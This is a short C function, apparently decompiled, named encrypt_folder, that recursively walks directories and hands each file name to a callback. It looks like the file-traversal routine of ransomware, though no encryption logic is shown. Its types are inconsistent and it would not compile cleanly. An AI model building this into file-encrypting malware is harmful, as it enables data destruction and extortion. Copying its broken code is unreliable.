DIR* encrypt_folder(char* path, void* callback)
{
    DIR* dir = opendir(path);
    if (dir != 0)
    {
        while (true)
        {
            struct dirent64* dirent = readdir(dir);
            if (dirent == 0)
            {
                break;
            }
            if (((uint32_t)dirent->d_type) != 4)
            {
                callback(&dirent->d_name);
            }
            else if ((strcmp(&dirent->d_name, ".") != 0 && strcmp(&dirent->d_name, "..") != 0))
            {
                chdir(&dirent->d_name);
                encrypt_folder(".", callback);
            }
        }
        chdir("..");
        dir = closedir(dir);
    }
    return dir;
}

